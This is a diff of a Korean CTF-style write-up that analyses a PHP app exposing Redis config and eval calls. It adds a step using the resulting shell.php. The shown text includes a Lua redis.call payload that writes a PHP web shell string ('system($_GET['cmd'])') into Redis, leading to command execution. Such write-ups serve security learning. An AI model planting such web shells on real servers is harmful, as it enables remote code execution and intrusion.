@@ -11,7 +11,7 @@ tags:
 # 2. 문제 분석
 - config.php 페이지에서 접근해 입력하게 되면 php에서 Redis config 확장 메서드를 사용해 요청 보낸다.
 	- config.php 파일 코드
-	  ```php
+```php
 	  <?php
          if(isset($_POST['option'])){
            $redis = new Redis();
@@ -26,8 +26,8 @@ tags:
            echo '<h1 class="subtitle">Result</h1>';
            echo "<pre>$ret</pre>";
            }
-     ?>
-	  ```
+     ?>	  
+```
 - index.php 페이지에서는 Redis eval 확장 메서드를 사용해 입력 받은 cmd를 lua 스크립트로 보낸다.
 ```php
 if(isset($_POST['cmd'])){
@@ -46,5 +46,5 @@ if(isset($_POST['cmd'])){
 	![[Pasted image 20260713162212.png]]
 4. command 페이지는 eval 메서드를 사용하기 때문에 lua 스크립트에서 Redis DB와 상호 작용하기 위해 호출하는 함수 redis.call을 사용해 php 쉘 문자열을 입력해 저장한다.
 	`return redis.call("set", "tmp", "<?php system($_GET['cmd']); ?>");`
-	![[Pasted image 20260713162927.png]]
-5. 
+	![[Pasted image 20260713202100.png]]
+5. url을 사용해 설정한 shell.php 안에 있는 cmd에 명령을 삽입해 flag를 확인할 수 있다.![[Pasted image 20260713203353.png]]
